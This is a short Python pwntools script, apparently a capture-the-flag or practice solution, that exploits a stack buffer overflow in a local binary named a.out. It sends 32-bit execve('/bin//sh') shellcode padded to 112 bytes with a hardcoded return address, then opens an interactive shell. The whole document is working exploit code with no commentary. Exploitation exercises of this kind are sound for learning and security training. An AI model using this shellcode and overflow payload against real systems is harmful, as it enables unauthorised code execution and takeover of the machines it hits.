from pwn import *

io = process('./a.out')

ret = 0xffffd06c
shellcode = b'\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'

payload = shellcode + b"A" * (112 - len(shellcode)) + p32(ret)
io.send(payload)
io.interactive()
